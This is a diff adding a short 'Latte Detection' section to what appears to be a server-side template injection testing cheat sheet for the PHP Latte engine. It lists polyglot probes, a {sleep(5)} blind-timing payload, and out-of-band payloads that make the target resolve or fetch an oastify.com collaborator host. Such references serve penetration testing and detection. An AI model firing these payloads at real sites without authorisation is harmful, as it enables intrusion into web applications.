@@ -150,3 +150,19 @@ composer require illuminate/view illuminate/events
 php -s 127.0.0.1:5001
 ```
 ---
+### Latte Detection
+
+#### Universal Non-Error-Based Polyglots
+- `p ">[[${{1}}]]` - p ">[[${1}]]
+
+#### Specific Non-Error-Based Polyglots
+- `{{1}}@*` - {1}@*
+- `{{1in[1]}}` - {1}
+
+#### Blind SSTI
+- `{sleep(5)}` - delays can be observed
+- `{gethostbyname('dns-test1.0jktexbb61trmy2vuzutvubwnnteh65v.oastify.com')}` - DNS based if web traffic is blocked
+- `{file_get_contents('http://latte-test.0jktexbb61trmy2vuzutvubwnnteh65v.oastify.com')}` - HTTP request trigger works only if web traffic is allowed
+
+---
+### 
